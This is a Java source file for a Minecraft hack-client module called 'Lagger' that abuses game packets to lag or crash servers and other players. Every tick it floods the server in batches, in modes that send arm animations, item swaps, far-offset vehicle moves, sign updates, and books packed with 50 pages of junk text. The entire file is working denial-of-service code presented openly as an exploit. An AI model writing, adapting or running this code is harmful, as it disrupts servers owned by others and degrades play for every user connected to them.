package com.matt.forgehax.mods;

import static com.matt.forgehax.Helper.getLocalPlayer;
import static com.matt.forgehax.Helper.getNetworkManager;
import static com.matt.forgehax.Helper.getWorld;

import com.matt.forgehax.util.command.Setting;
import com.matt.forgehax.util.mod.Category;
import com.matt.forgehax.util.mod.ToggleMod;
import com.matt.forgehax.util.mod.loader.RegisterMod;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.tileentity.TileEntity;
import net.minecraft.tileentity.TileEntitySign;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.TextComponentString;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.network.play.client.CPacketVehicleMove;
import net.minecraft.network.play.client.CPacketUpdateSign;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.inventory.ClickType;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.text.TextFormatting;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;

@RegisterMod
public class Lagger extends ToggleMod {

  private enum LagMode {
    ANIMATION, SWAP, ENTITY, SIGN, BOOK, BOOKMOVE
  }

  private final Setting<LagMode> mode =
    getCommandStub()
      .builders()
      .<LagMode>newSettingEnumBuilder()
      .name("mode")
      .description("Mode to use to lag[ANIMATION/SWAP/ENTITY/SIGN/BOOK/BOOKMOVE]")
      .defaultTo(LagMode.SWAP)
      .build();

  private final Setting<Integer> batch_size =
    getCommandStub()
      .builders()
      .<Integer>newSettingBuilder()
      .name("size")
      .description("Size of each packet batch")
      .min(1)
      .max(50)
      .defaultTo(5)
      .build();

  private final Setting<Boolean> auto_disable =
    getCommandStub()
      .builders()
      .<Boolean>newSettingBuilder()
      .name("disable")
      .description("Disable when disconnected")
      .defaultTo(true)
      .build();
  
  public Lagger() {
    super(Category.EXPLOIT, "Lagger", false, "Abuse various exploits to lag players or server");
  }

  @Override
  public String getDisplayText() {
    return super.getDisplayText() + " [" +
            TextFormatting.DARK_GRAY + mode.get().toString() +
            TextFormatting.RESET + "]";
  }
  
  @SubscribeEvent
  public void onClientTick(TickEvent.ClientTickEvent event) {
    if (getLocalPlayer() == null || getNetworkManager() == null) {
      if (auto_disable.get())
        this.disable(false);
      return;
    }
    switch (mode.get()) {
      case ANIMATION:
        for (int i=0; i<batch_size.get(); i++) {
          getNetworkManager().sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
        }
        break;
      case SWAP:
        for (int i=0; i<batch_size.get(); i++) {
          getNetworkManager().sendPacket(
            new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS,
                                BlockPos.ORIGIN, getLocalPlayer().getHorizontalFacing()));
        }
        break;
      case ENTITY:
        for (int i=0; i<batch_size.get(); i++) {
          final Entity riding = getLocalPlayer().getRidingEntity();
          if (riding != null) {
            riding.posX = getLocalPlayer().posX;
            riding.posY = getLocalPlayer().posY + 1337;
            riding.posZ = getLocalPlayer().posZ;
            getNetworkManager().sendPacket(new CPacketVehicleMove(riding));
          }
        }
        break;
      case SIGN:
        for (TileEntity te : getWorld().loadedTileEntityList) {
          if (te instanceof TileEntitySign) {
            final TileEntitySign tileEntitySign = (TileEntitySign) te;
            for (int i=0; i<batch_size.get(); i++) {
                getNetworkManager().sendPacket(
                  new CPacketUpdateSign(tileEntitySign.getPos(),
                  new TextComponentString[]{
                    new TextComponentString("this is"),
                    new TextComponentString("totally"),
                    new TextComponentString("a legit action"),
                    new TextComponentString("i swear")}));
            }
          }
        }
        break;
      case BOOK:
      case BOOKMOVE:
        final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagList pages = new NBTTagList();

        for (int page = 0; page < 50; page++) {
          pages.appendTag(new NBTTagString("192i9i1jr1fj8fj893fj84ujv8924jv2j4c8j248vj2498u2-894u10fuj0jhv20j204uv902jv90j209vj204vj"));
        }

        final NBTTagCompound tag = new NBTTagCompound();
        tag.setString("author", getLocalPlayer().getName());
        tag.setString("title", "I think you need better plugins");
        tag.setTag("pages", pages);
        itemStack.setTagCompound(tag);

        for (int i=0; i<batch_size.get(); i++) {
          if (mode.get() == LagMode.BOOK)
            getNetworkManager().sendPacket(new CPacketCreativeInventoryAction(0, itemStack));
          else if (mode.get() == LagMode.BOOKMOVE)
            getNetworkManager().sendPacket(new CPacketClickWindow(0, 0, 0,
                                                      ClickType.PICKUP, itemStack, (short)0));
        }
        break;
    }
  }
}
